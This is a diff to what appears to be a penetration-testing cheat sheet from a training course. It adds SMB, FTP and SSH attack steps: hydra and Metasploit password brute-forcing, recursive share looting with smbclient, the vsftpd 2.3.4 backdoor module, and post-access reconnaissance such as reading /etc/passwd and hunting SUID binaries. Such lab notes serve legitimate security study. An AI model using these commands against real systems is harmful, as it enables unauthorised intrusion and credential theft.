@@ -59,12 +59,22 @@ smbclient \\\\<TARGET_IP>\\c$ -N -U ""        # then: get file_shared.txt
 gzip -d /usr/share/wordlists/rockyou.txt.gz
 hydra -l admin -P /usr/share/wordlists/rockyou.txt <TARGET_IP> smb
 
-# metasploit
-use auxiliary/scanner/smb/smb_version
-use auxiliary/scanner/smb/smb_enumusers
-use auxiliary/scanner/smb/smb_enumshares
-use auxiliary/scanner/smb/smb_login        # set SMBUser / PASS_FILE / RHOSTS
-use auxiliary/scanner/smb/pipe_auditor
+# metasploit auxiliary workflow (setg RHOSTS <TARGET_IP> first)
+use auxiliary/scanner/smb/smb_version        # OS + SMB/Samba version
+use auxiliary/scanner/smb/smb_enumusers      # local users via SAM RPC
+use auxiliary/scanner/smb/smb_enumusers_domain   # set SMBDomain WORKGROUP
+use auxiliary/scanner/smb/smb_enumshares     # set ShowFiles true  → readable shares + paths
+use auxiliary/scanner/smb/smb_login          # set SMBUser/USER_FILE + PASS_FILE ; STOP_ON_SUCCESS true ; creds → DB
+use auxiliary/scanner/smb/smb_security_mode  # signing / security level
+use auxiliary/scanner/smb/pipe_auditor       # (smb_enum_pipes) named pipes
+use auxiliary/scanner/smb/smb_enum_gpp       # Group Policy Preferences (cpassword creds)
+# smb_login key opts: BLANK_PASSWORDS true · USER_AS_PASS true · DB_ALL_CREDS/USERS/PASS true · BRUTEFORCE_SPEED 0-5
+```
+Access shares with found creds:
+```bash
+smbclient -L <TARGET_IP> -U <USER>
+smbclient //<TARGET_IP>/public -U "<USER>%<PW>" -c "ls; get flag.txt; quit"
+smbclient "//<TARGET_IP>/<share>" -U "<USER>%<PW>" -c "prompt; recurse; mget *" -D /tmp/smb/
 ```
 
 ## FTP (21)
@@ -72,9 +82,15 @@ use auxiliary/scanner/smb/pipe_auditor
 sudo nmap -p 21 -sV -sC -O <TARGET_IP>
 nmap -p 21 --script ftp-anon <TARGET_IP>
 nmap -p 21 --script ftp-brute --script-args userdb=<USERS_LIST> <TARGET_IP>
-ftp <TARGET_IP>                              # ls / cd / get / put
+ftp <TARGET_IP>                              # ls / cd / get <file> / put ; binary for non-text
 hydra -L common_users.txt -P unix_passwords.txt <TARGET_IP> -t 4 ftp
+# metasploit auxiliary workflow (setg RHOSTS <TARGET_IP>)
+use auxiliary/scanner/ftp/ftp_version        # banner, e.g. "220 (vsFTPd 2.3.4)" → search vsftpd
+use auxiliary/scanner/ftp/anonymous          # anonymous login allowed?
+use auxiliary/scanner/ftp/ftp_login          # set USER_FILE + PASS_FILE ; STOP_ON_SUCCESS true ; THREADS
+#   opts: USER_AS_PASS true · BLANK_PASSWORDS true · BRUTEFORCE_SPEED 0-5 · FTPUSER/FTPPASS
 ```
+vsFTPd 2.3.4 → `use exploit/unix/ftp/vsftpd_234_backdoor` (see module 05/08). Loot files, then test creds on other services (reuse).
 
 ## SSH (22)
 ```bash
@@ -86,8 +102,14 @@ nmap -p 22 --script=ssh-run --script-args="ssh-run.cmd=cat /home/student/FLAG, s
 nmap -p 22 --script=ssh-brute --script-args userdb=<USERS_LIST> <TARGET_IP>
 ssh <USER>@<TARGET_IP>
 hydra -l <USER> -P /usr/share/wordlists/rockyou.txt <TARGET_IP> ssh
-use auxiliary/scanner/ssh/ssh_login          # set USERPASS_FILE / STOP_ON_SUCCESS true
+# metasploit auxiliary workflow (setg RHOSTS <TARGET_IP>)
+use auxiliary/scanner/ssh/ssh_version            # e.g. SSH-2.0-OpenSSH_7.9p1
+use auxiliary/scanner/ssh/ssh_enumusers          # time-based user enum ; set USER_FILE ; CHECK_FALSE true
+use auxiliary/scanner/ssh/ssh_login              # set USERNAME/USER_FILE + PASS_FILE ; STOP_ON_SUCCESS true
+#   a successful ssh_login OPENS A SESSION → sessions -i 1  (opts: USER_AS_PASS / BLANK_PASSWORDS / BRUTEFORCE_SPEED 0-5)
+use auxiliary/scanner/ssh/ssh_identify_pubkeys   # which keys a user accepts (set USER_FILE / KEY_FILE)
 ```
+After access: `whoami; id; sudo -l; cat /etc/passwd; uname -a` → privesc (SUID `find / -perm -4000`, cron) — see module 05. Test creds elsewhere (reuse).
 
 ## HTTP (80/443)
 ```bash
